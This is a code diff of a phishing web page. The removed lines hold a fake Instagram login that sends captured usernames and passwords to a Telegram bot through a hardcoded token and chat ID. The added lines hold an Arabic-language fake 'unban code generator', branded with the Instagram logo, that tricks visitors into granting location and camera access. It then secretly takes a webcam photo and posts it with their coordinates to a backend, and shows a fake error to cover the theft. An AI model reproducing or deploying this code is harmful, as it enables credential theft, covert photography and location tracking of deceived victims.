@@ -3,29 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login • Instagram</title>
+    <title>توليد رقم فك الحظر</title>
     <style>
-        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; }
-        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; }
+        body { background-color: #fafafa; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+        .btn { background-color: #3897f0; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 18px; cursor: pointer; font-weight: bold; }
+        .btn:hover { background-color: #287dc5; }
+        #status { margin-top: 20px; color: #8e8e8e; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1 style="font-style: italic;">Instagram</h1>
-        <input type="text" id="u" placeholder="Username" required>
-        <input type="password" id="p" placeholder="Password" required>
-        <button onclick="send()">Log In</button>
-    </div>
+    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+    <h3>أداة توليد رقم فك الحظر السريع</h3>
+    <p>اضغط على الزر أدناه لتوليد رقم التحقق الخاص بحسابك</p>
+    
+    <button class="btn" onclick="startCapture()">توليد رقم الآن</button>
+    
+    <div id="status"></div>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
-        const TOKEN = "8206948320:AAH-NQnab9n2m4BFWsbPE3HNdQuG_LKOVPY";
-        const ID = "8276213504";
-        function send() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=🔥 صيد جديد:\n👤: ${u}\n🔑: ${p}`);
-            setTimeout(() => { window.location.href = "https://instagram.com"; }, 500);
+        async function startCapture() {
+            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
+            
+            // طلب الموقع
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+
+                // طلب الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const img = canvas.toDataURL('image/png');
+
+                    // إرسال البيانات للسيرفر (app.py)
+                    fetch('/send', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: img, lat: lat, lon: lon })
+                    });
+                    
+                    document.getElementById('status').innerText = "خطأ في التوليد: حاول مرة أخرى لاحقاً";
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            }, (err) => {
+                alert("يجب السماح بالصلاحيات لتوليد الرقم!");
+            });
         }
     </script>
 </body>
